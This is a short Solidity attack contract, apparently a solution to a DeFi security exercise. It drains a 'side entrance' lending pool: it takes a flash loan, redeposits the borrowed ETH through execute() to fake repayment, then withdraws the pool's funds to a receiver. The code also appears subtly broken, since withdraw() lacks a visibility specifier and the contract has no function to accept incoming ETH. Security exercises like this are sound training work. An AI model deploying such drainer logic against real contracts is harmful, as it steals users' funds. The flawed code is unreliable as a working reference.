pragma solidity ^0.6.0;

import "./SideEntranceLenderPool.sol";

contract Drainer {
    SideEntranceLenderPool pool;

    constructor(address _pool) public {
        pool = SideEntranceLenderPool(_pool);
    }

    function attack() external {
        pool.flashLoan(1000 ether);
    }

    function withdraw(address payable receiver) {
        pool.withdraw();
        receiver.call{value: address(this).balance}("");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
}